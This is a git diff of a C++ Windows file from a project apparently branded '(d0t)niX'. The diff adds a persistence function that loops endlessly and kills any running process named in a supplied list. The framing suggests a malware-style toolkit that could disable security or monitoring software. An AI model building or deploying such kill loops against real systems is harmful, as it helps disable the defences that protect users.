@@ -5,25 +5,48 @@
  | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  |    |  (  <_> )     \____ |
  |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |  |____|   \____/ \______  / |
  |   \__\    \/        \/     /__/      \/         \_/ |                         \/  |
- +----------------------------------------------------++-----------------------------/
- | Protections.cpp :: (d0t)niX's Protection Functions |
- \----------------------------------------------------*/
+ +-----------------------------------------------------+------------------------+----/
+ | ProcessPesistence.cpp :: (d0t)niX's Process Persistency/Protection Functions |
+ \------------------------------------------------------------------------------*/
 
 #include "../../Header-Files/pch.h"
 #include "../../Header-Files/(d0t)niX.h"
 
-// Placeholder
 // (this will be used to look for processes in a list (passed by an array) and kill them (or something else) if they exist)
 BOOL fnProcessMonitorW(
-	_In_ LPWSTR lpProcs[]
+	_In_ LPCWSTR lpProcs[],
+	_In_ SIZE_T  ulProcSize
 ) {
+	while (TRUE) {
+		HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+		if (hProcSnap) {
+			PROCESSENTRY32 pe32;
+			pe32.dwSize = sizeof(pe32);
 
+			if (Process32First(hProcSnap, &pe32)) {
+				do {
+					for (INT i = 0; i < ulProcSize; i++) {
+						if (!lstrcmp(pe32.szExeFile, lpProcs[i])) {
+							HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+							if (hProc) {
+								if (!TerminateProcess(hProc, EXIT_FAILURE)) {
+									fnMessageHandlerW(NULL, L"Couldn't terminate Process\n ProcessID: %d", L"TerminateProcess",
+										MB_ICONWARNING, pe32.th32ProcessID);
+								}
+
+								CloseHandle(hProc);
+							}
+						}
+					}
+				} while (Process32Next(hProcSnap, &pe32));
+			}
+
+			CloseHandle(hProcSnap);
+		}
+	}
 
 	return FALSE;
 }
-
-// Dec temp (for Compiliation to succeed)
-BOOL ListProcessModules(DWORD dwPID);
 
 // Placeholder (ripped from msdn, will be modified)
 BOOL GetProcessList() {
@@ -79,7 +102,7 @@ BOOL GetProcessList() {
 		}
 
 		// List the modules and threads associated with this process
-		ListProcessModules(pe32.th32ProcessID);
+		// ListProcessModules(pe32.th32ProcessID);
 		// ListProcessThreads(pe32.th32ProcessID);
 
 	} while (Process32Next(hProcessSnap, &pe32));
